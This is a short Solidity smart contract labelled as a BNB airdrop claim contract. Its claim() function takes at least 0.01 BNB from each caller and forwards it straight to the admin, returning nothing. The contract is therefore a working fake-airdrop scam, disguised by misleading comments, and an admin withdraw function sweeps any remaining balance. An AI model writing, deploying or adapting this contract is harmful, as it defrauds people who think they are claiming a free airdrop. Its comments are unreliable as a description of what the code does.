// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title ClaimBNB Airdrop Contract
/// @author Bolt
/// @notice This contract handles BNB airdrop claims
/// @custom:security-contact support@example.com
/// @custom:dev-run-script scripts/deploy.js
contract ClaimBNBAirDrop {
    address payable public admin;
    mapping(address => bool) public hasClaimed;
    uint256 public constant MIN_AMOUNT = 0.01 ether;
    
    event ClaimProcessed(address indexed user, uint256 amount);
    
    constructor() payable {
        admin = payable(msg.sender);
    }
    
    /// @notice Allows users to claim the airdrop by sending BNB
    function claim() external payable {
        require(msg.value >= MIN_AMOUNT, "Minimum amount required");
        require(!hasClaimed[msg.sender], "Already claimed");
        
        hasClaimed[msg.sender] = true;
        
        (bool success, ) = admin.call{value: msg.value}("");
        require(success, "Transfer failed");
        
        emit ClaimProcessed(msg.sender, msg.value);
    }
    
    /// @notice Allows admin to withdraw any remaining BNB
    function withdraw() external {
        require(msg.sender == admin, "Only admin");
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance");
        
        (bool success, ) = admin.call{value: balance}("");
        require(success, "Withdraw failed");
    }
    
    receive() external payable {}
}